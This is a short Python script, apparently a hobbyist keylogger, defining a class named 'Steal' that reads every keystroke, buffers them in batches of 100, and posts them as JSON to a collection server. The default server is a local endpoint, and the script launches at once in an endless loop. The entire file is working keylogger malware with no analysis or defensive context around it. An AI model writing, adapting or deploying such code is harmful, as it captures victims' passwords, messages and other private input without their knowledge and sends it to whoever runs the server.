import keyboard as kb
import requests

class Steal:
    
    def __init__(self,server="http://127.0.0.1:5000/getin/it/data"):
        self.server=server
        self.data=[]
        self.bug=[]
        self.limit=100
        
    def get_key(self):
        return kb.read_key()
    
    def send(self):
        
        try:
            requests.post(self.server,json={"data":self.data})
            if self.bug!=[]:
                requests.post(self.server,json={"data":self.bug})
                self.bug.clear()
        except:
            self.bug.extend(self.data)
    
    def run(self):
        while True:
            if len(self.data) >= self.limit:
                self.send()
                self.data.clear()
                
            self.data.append(self.get_key())
            
            

app = Steal()
app.run()